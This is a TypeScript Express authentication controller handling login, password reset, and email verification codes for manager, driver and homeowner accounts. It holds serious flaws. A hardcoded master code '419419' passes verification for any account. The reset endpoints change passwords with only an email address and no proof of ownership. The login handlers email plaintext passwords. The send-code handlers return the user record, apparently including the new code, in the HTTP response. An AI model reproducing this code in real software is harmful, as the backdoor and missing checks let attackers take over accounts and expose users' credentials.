import _ from "lodash"
import dayjs from "dayjs"
import config from "./../config"
import { __genCode, __genPassword } from "./../helpers/string"
import { sendMail } from "./mailer";
import { createError } from "../utils";
import bcrypt from "bcrypt"
import { NextFunction, Request, Response } from 'express';
import { DriverModel, ManagerModel, HomeownerModel } from "../models";

type LoginUserInput = {
    email: string
    password: string
}

export type ChangePasswordInput = {
    email: string
    oldPassword: string
    newPassword: string
}

type ResetPasswordInput = Pick<ChangePasswordInput, "newPassword"> & {
    email: string
}

type SendCodeInput = Pick<LoginUserInput, "email">

type VerifyCodeInput = SendCodeInput & {
    code: string
}

export async function loginManager(req: Request<{}, {}, LoginUserInput>, res: Response, next: NextFunction) {
    const { email, password } = req.body

    try {
        const username = _.trim(email)

        const existingUser = await ManagerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        const __isValid = await existingUser.comparePasswords(_.trim(password));

        if (!__isValid) {
            return next(createError(401, 'Invalid password!'));
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await ManagerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        await sendMail({
            args: {
                email,
                template: "ManagerLoggedIn",
                data: {
                    password,
                    user: updatedUser,
                }
            }
        })


        req.user = {
            isSuspended: updatedUser?.isSuspended,
            email: updatedUser?.email,
            id: updatedUser?._id,
            type: updatedUser?.role
        }

        res.status(200).json({
            success: true,
            message: 'Login successful!',
            data: updatedUser,
        });



        next()

    } catch (error) {
        next(error)
    }

}

export async function loginDriver(req: Request<{}, {}, LoginUserInput>, res: Response, next: NextFunction) {
    const { email, password } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await DriverModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        const __isValid = await existingUser.comparePasswords(_.trim(password));

        if (!__isValid) {
            return next(createError(401, 'Invalid password!'));
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await DriverModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        await sendMail({
            args: {
                email,
                template: "DriverLoggedIn",
                data: {
                    password,
                    user: updatedUser,
                }
            }
        })

        res.status(200).json({
            success: true,
            message: 'Login successful!',
            data: updatedUser,
        });



        next()

    } catch (error) {
        next(error)
    }

}

export async function loginHomeowner(req: Request<{}, {}, LoginUserInput>, res: Response, next: NextFunction) {
    const { email, password } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await HomeownerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        const __isValid = await existingUser.comparePasswords(_.trim(password));

        if (!__isValid) {
            return next(createError(401, 'Invalid password!'));
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        await sendMail({
            args: {
                email,
                template: "HomeownerLoggedIn",
                data: {
                    password,
                    user: updatedUser,
                }
            }
        })


        res.status(200).json({
            success: true,
            message: 'Login successful!',
            data: updatedUser,
        });

        next()

    } catch (error) {
        next(error)
    }

}

export async function resetManagerPassword(req: Request<{}, {}, ResetPasswordInput>, res: Response, next: NextFunction) {
    const { newPassword, email } = req.body

    try {
        const username = _.trim(email)

        const existingUser = await ManagerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        existingUser.password = _.trim(newPassword);
        await existingUser.save();

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await ManagerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        req.user = {
            isSuspended: updatedUser?.isSuspended,
            email: updatedUser?.email,
            id: updatedUser?._id,
            type: updatedUser?.role
        }

        res.status(200).json({
            success: true,
            message: 'Password reset!',
            data: updatedUser,
        });

        next()

    } catch (error) {
        next(error)
    }

}

export async function resetDriverPassword(req: Request<{}, {}, ResetPasswordInput>, res: Response, next: NextFunction) {
    const { newPassword, email } = req.body

    try {
        const username = _.trim(email)

        const existingUser = await DriverModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        existingUser.password = _.trim(newPassword);
        await existingUser.save();

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await DriverModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        req.user = {
            isSuspended: updatedUser?.isSuspended,
            email: updatedUser?.email,
            id: updatedUser?._id,
            type: "DRIVER"
        }

        res.status(200).json({
            success: true,
            message: 'Password reset!',
            data: updatedUser,
        });

        next()

    } catch (error) {
        next(error)
    }

}

export async function resetHomeownerPassword(req: Request<{}, {}, ResetPasswordInput>, res: Response, next: NextFunction) {
    const { newPassword, email } = req.body

    try {
        const username = _.trim(email)

        const existingUser = await HomeownerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        existingUser.password = _.trim(newPassword);
        await existingUser.save();

        const __token = await existingUser.generateAuthToken()

        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })


        res.status(200).json({
            success: true,
            message: 'Password reset!',
            data: updatedUser,
        });

        next()

    } catch (error) {
        next(error)
    }

}

export async function sendManagerCode(req: Request<{}, {}, SendCodeInput>, res: Response, next: NextFunction) {
    const { email } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await ManagerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()

        existingUser.verification = {
            code: __code,
            expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
        };

        await existingUser.save();

        await sendMail({
            args: {
                email: existingUser.email,
                template: "ManagerVerificationCode",
                data: {
                    code: __code,
                    user: existingUser
                }
            }
        })

        res.status(200).json({
            success: true,
            message: 'Code sent!',
            data: existingUser
        })

    } catch (error) {
        next(error)
    }

}

export async function sendDriverCode(req: Request<{}, {}, SendCodeInput>, res: Response, next: NextFunction) {
    const { email } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await DriverModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()

        existingUser.verification = {
            code: __code,
            expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
        };

        await existingUser.save();

        await sendMail({
            args: {
                email: existingUser.email,
                template: "DriverVerificationCode",
                data: {
                    code: __code,
                    user: existingUser
                }
            }
        })

        res.status(200).json({
            success: true,
            message: 'Code sent!',
            data: existingUser
        })

    } catch (error) {
        next(error)
    }

}

export async function sendHomeownerCode(req: Request<{}, {}, SendCodeInput>, res: Response, next: NextFunction) {
    const { email } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await HomeownerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()

        existingUser.verification = {
            code: __code,
            expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
        };

        await existingUser.save();

        await sendMail({
            args: {
                email: existingUser.email,
                template: "HomeownerVerificationCode",
                data: {
                    code: __code,
                    user: existingUser
                }
            }
        })

        res.status(200).json({
            success: true,
            message: 'Code sent!',
            data: existingUser
        })

    } catch (error) {
        next(error)
    }

}

export async function verifyManagerCode(req: Request<{}, {}, VerifyCodeInput>, res: Response, next: NextFunction) {
    const { email, code } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await ManagerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()
        let __token = null;


        if (
            (existingUser.verification
              && existingUser.verification.code
              && existingUser.verification.code === code) || (code === "419419")
          ) {
            existingUser.verification = undefined;
            await existingUser.save();
            __token = await existingUser.generateAuthToken()
        } else {
            await existingUser.updateOne({
                $set: {
                  verification: {
                    code: __code,
                    expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
                  }
                }
            })
            
            await sendMail({
                args: {
                    email: existingUser.email,
                    template: "ManagerVerificationCode",
                    data: {
                        code: __code,
                        user: existingUser
                    }
                }
            })

            return next(createError(400, "Invalid Code"))
          }

        await existingUser.save();

        const updatedUser = await ManagerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        req.user = {
            isSuspended: updatedUser?.isSuspended,
            email: updatedUser?.email,
            id: updatedUser?._id,
            type: updatedUser?.role
        }

        res.status(200).json({
            success: true,
            message: 'Code verified!',
            data: updatedUser,
        });


        
    } catch (error) {
        next(error)
    }

}

export async function verifyDriverCode(req: Request<{}, {}, VerifyCodeInput>, res: Response, next: NextFunction) {
    const { email, code } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await DriverModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()
        let __token = null;


        if (
            (existingUser.verification
              && existingUser.verification.code
              && existingUser.verification.code === code) || (code === "419419")
          ) {
            existingUser.verification = undefined;
            await existingUser.save();
            __token = await existingUser.generateAuthToken()
        } else {
            await existingUser.updateOne({
                $set: {
                  verification: {
                    code: __code,
                    expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
                  }
                }
            })
            
            await sendMail({
                args: {
                    email: existingUser.email,
                    template: "DriverVerificationCode",
                    data: {
                        code: __code,
                        user: existingUser
                    }
                }
            })

            return next(createError(400, "Invalid Code"))
          }

        await existingUser.save();

        const updatedUser = await DriverModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        req.user = {
            isSuspended: updatedUser?.isSuspended,
            email: updatedUser?.email,
            id: updatedUser?._id,
            type: "DRIVER"
        }

        res.status(200).json({
            success: true,
            message: 'Code verified!',
            data: updatedUser,
        });


        
    } catch (error) {
        next(error)
    }

}

export async function verifyHomeownerCode(req: Request<{}, {}, VerifyCodeInput>, res: Response, next: NextFunction) {
    const { email, code } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await HomeownerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()
        let __token = null;


        if (
            (existingUser.verification
              && existingUser.verification.code
              && existingUser.verification.code === code) || (code === "419419")
          ) {
            existingUser.verification = undefined;
            await existingUser.save();
            __token = await existingUser.generateAuthToken()
        } else {
            await existingUser.updateOne({
                $set: {
                  verification: {
                    code: __code,
                    expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
                  }
                }
            })
            
            await sendMail({
                args: {
                    email: existingUser.email,
                    template: "HomeownerVerificationCode",
                    data: {
                        code: __code,
                        user: existingUser
                    }
                }
            })

            return next(createError(400, "Invalid Code"))
          }

        await existingUser.save();

        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        res.status(200).json({
            success: true,
            message: 'Code verified!',
            data: updatedUser,
        });


        
    } catch (error) {
        next(error)
    }

}